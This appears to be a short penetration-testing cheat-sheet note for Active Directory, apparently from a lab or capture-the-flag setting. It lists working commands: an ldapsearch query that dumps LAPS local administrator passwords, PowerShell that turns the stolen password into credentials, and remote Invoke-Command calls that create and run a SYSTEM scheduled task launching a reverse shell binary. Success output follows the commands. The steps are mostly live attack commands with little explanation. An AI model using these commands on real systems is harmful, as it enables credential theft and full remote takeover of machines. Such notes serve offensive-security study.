
![[Pasted image 20220328113745.png]]

```bash - kali
ldapsearch -v -x -D $USER@$HOSTNAME.$DOMAIN -w $PASSWORD -b "DC=$HOSTNAME,DC=$DOMAIN" -h $TARGET "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

```powershell - windows
powershell
```

Use found password from above here.

```powershell - windows
$pw = ConvertTo-SecureString "$PASSWORD" -AsPlainText -Force
```

```powershell - windows
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
```

Make sure the path to reverse.exe is correct below.

```powershell - windows
Invoke-Command -Computer $HOSTNAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\Windows\Temp\Tools\reverse64.exe /ru SYSTEM } -Credential $creds
```

![[rlwrap]]

SUCCESS: The scheduled task "shell" has successfully been created.

```powershell - windows
Invoke-Command -Computer $HOSTNAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

SUCCESS: Attempted to run the scheduled task "shell".
